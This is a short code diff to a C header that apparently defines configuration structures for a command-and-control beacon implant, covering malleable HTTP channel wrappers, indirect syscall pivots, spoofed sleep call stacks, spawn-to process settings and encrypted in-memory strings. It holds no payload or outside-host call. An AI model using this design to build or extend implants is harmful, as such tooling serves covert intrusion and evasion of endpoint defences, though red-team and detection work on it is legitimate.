@@ -98,9 +98,9 @@ struct PayloadLocation {
 struct PCFG_ChannelMalleable {
     uint8_t       malleable_mode;  // PCFG_MALLEABLE_*
     char*         wrapper_prefix;
-    uint8_t       wrapper_prefix_len;
+    uint16_t      wrapper_prefix_len;
     char*         wrapper_suffix;
-    uint8_t       wrapper_suffix_len;
+    uint16_t      wrapper_suffix_len;
     HTTP_header*  headers;         // linked list head
     uint8_t       numHeaders;
     PayloadLocation payload_location;
@@ -195,6 +195,7 @@ struct BeaconConfig {
     char*   indirect_pivot;       // Custom syscalls pivot API (e.g., "ZwAreMappedFilesTheSame")
     uint16_t pad_max;              // Maximum padding length for PKCS#7
     uint16_t num_spoof_frames;     // Additional fake frames on spoofed sleep stack (default 6)
+    uint32_t max_response_size;    // Maximum response body size in bytes (default 64MB)
 
     // Spawn-to configuration (supports %%VAR%% runtime expansion via CreateProcessA)
     uint8_t  spawnto_x64_len;
@@ -216,6 +217,11 @@ struct BeaconConfig {
     // Stack spoof chain (heap-allocated array, resolved at boot)
     uint16_t         stack_chain_count;
     StackChainEntry* stack_chain;  // malloc'd array of stack_chain_count
+
+    // In-memory append strings (encrypted in config, decrypted at startup)
+    // malloc'd array
+    uint8_t  in_memory_append_count;
+    char**   in_memory_append;     // malloc'd array of strings
 };
 
 // =============================================================================
